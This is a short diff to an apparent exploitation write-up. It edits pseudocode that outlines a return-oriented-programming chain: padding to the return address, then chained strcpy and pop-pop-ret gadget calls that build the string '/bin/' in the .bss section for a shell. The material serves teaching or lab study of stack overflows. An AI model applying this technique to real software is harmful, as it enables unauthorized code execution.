@@ -217,9 +217,9 @@ I would include the python code but it gets really boring, you can look it up in
 But i will put together the logic here of how we could construct the exploit.
 
 ```
-1036 bytes exactly till ret address
+1036 bytes exactly till ret address 
 strcpy@plt + pop_pop_ret_gadget  + bss + "/" 
-strcpy@plt + pop_pop_ret_gadget  + bss + 1 + "b" #bss + 1 because if we use the same address it will overwrite the previous character
+strcpy@plt + pop_pop_ret_gadget  + (bss + 1) + "b" #bss + 1 because if we use the same address it will overwrite the previous character
 strcpy@plt + pop_pop_ret_gadget  + (bss + 2) + "i" 
 strcpy@plt + pop_pop_ret_gadget  + (bss + 3) + "n"
 strcpy@plt + pop_pop_ret_gadget  + (bss + 4) + "/"
